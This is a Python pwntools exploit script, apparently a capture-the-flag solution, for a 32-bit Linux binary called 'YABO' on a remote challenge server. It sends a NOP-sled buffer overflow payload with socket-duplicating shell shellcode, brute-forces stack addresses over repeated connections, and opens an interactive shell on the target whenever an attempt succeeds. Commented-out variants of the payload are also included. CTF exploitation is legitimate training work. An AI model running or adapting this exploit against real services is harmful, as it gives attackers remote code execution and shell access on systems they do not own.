from pwn import *
context(os = 'linux', arch = 'i386')
context.log_level = 'debug'
# print( b'\x00' in asm(shellcraft.dupsh(4)))
# p = remote('challenge.ctf.games', 32762)
# e = ELF('./YABO')

nop_ret = 0x804924f
ret = 0x804900e
offset = 0x410
shellcode = asm(shellcraft.dupsh(4))
# start = 0
for i in range(0xa010, 0xff10, 0x100):
    stack_addr = 0xffff0000 + i
    # payload = (b'a'*(offset+4) + p32(stack_addr)).ljust(0xe00, b'\x90') + shellcode
    payload = shellcode.rjust(offset, b'\x90') + p32(0xdeadbeef) + p32(stack_addr)
    print(hex(stack_addr), hex(len(payload)))
    # sleep(0.1)
    p = remote('challenge.ctf.games', 32762)
    p.recvuntil(b'What would you like to say?: ')
    p.send(payload)
    sleep(0.3)
    try:
        p.sendline(b'ls')
        p.recv()
        p.interactive()
        # break
    except:
        p.close()
        continue
# for i in range(0x10, 0xff10, 0x200):
    # p = remote('challenge.ctf.games', 32762)
    # payload1 = b'a'*(offset + 4) + p32(0x80495e1) + b'\x04'
    # p.recvuntil(b'What would you like to say?: ')
    # p.send(payload1)
    # # sleep(0.3)
    # p.recv()
